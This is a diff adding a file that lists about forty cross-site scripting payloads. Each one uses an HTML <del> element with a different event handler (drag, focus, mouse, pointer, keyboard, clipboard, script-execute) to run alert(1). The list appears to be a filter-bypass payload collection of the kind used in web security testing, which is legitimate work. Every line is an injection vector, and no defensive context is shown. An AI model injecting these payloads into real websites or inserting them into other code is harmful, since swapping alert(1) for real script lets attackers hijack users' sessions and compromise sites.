@@ -1,0 +1,43 @@
+<del draggable="true" ondrag="alert(1)">test</del>
+<del draggable="true" ondragend="alert(1)">test</del>
+<del draggable="true" ondragenter="alert(1)">test</del>
+<del draggable="true" ondragleave="alert(1)">test</del>
+<del draggable="true" ondragstart="alert(1)">test</del>
+<del id=x tabindex=1 onactivate=alert(1)></del>
+<del id=x tabindex=1 onbeforeactivate=alert(1)></del>
+<del id=x tabindex=1 onbeforedeactivate=alert(1)></del><input autofocus>
+<del id=x tabindex=1 ondeactivate=alert(1)></del><input id=y autofocus>
+<del id=x tabindex=1 onfocus=alert(1)></del>
+<del id=x tabindex=1 onfocusin=alert(1)></del>
+<del onafterscriptexecute=alert(1)><script>1</script>
+<del onbeforecopy="alert(1)" contenteditable>test</del>
+<del onbeforecut="alert(1)" contenteditable>test</del>
+<del onbeforepaste="alert(1)" contenteditable>test</del>
+<del onbeforescriptexecute=alert(1)><script>1</script>
+<del onblur=alert(1) tabindex=1 id=x></del><input autofocus>
+<del onclick="alert(1)">test</del>
+<del oncontextmenu="alert(1)">test</del>
+<del oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<del oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<del ondblclick="alert(1)" autofocus tabindex=1>test</del>
+<del onfocusout=alert(1) tabindex=1 id=x></del><input autofocus>
+<del onkeydown="alert(1)" contenteditable>test</del>
+<del onkeypress="alert(1)" contenteditable>test</del>
+<del onkeyup="alert(1)" contenteditable>test</del>
+<del onmousedown="alert(1)">test</del>
+<del onmouseenter="alert(1)">test</del>
+<del onmouseleave="alert(1)">test</del>
+<del onmousemove="alert(1)">test</del>
+<del onmouseout="alert(1)">test</del>
+<del onmouseover="alert(1)">test</del>
+<del onmouseup="alert(1)">test</del>
+<del onmousewheel=alert(1)>requires scrolling
+<del onpaste="alert(1)" contenteditable>test</del>
+<del onpointerdown=alert(1)>XSS</del>
+<del onpointerenter=alert(1)>XSS</del>
+<del onpointerleave=alert(1)>XSS</del>
+<del onpointermove=alert(1)>XSS</del>
+<del onpointerout=alert(1)>XSS</del>
+<del onpointerover=alert(1)>XSS</del>
+<del onpointerrawupdate=alert(1)>XSS</del>
+<del onpointerup=alert(1)>XSS</del>
